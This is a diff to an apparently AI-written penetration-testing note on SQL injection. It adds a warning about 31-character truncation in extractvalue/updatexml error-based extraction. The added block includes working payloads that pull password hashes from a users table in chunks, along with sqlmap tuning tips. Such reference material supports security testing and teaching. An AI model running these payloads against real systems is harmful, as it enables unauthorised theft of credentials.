@@ -327,6 +327,13 @@ Force DB to return data inside error messages:
 ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
 ```
 
+> [!warning] **`extractvalue`/`updatexml` truncate output to ~31 characters.** The XPATH error only echoes the first ~31 chars of your string, so a 32-hex MD5 or a 60-char bcrypt comes back **chopped**. Page long values with `SUBSTRING` and stitch them:
+> ```sql
+> ' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),1,31)))-- -
+> ' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 1),32,31)))-- -
+> ```
+> The leading `0x7e` (`~`) marker eats one char, so read in 31-char windows. This is also **why `sqlmap --hex` hurts error-based** — hex doubles length against this fixed cap; use `--no-cast` instead (see [[Tools/Database/SQLMap|SQLMap]]).
+
 ---
 
 ## Out-of-Band (OOB) Exfil
@@ -864,5 +871,5 @@ What you're up against, and where each control still leaks — useful for the re
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-20*
+*Updated: 2026-08-25*
 *Model: claude-opus-5*
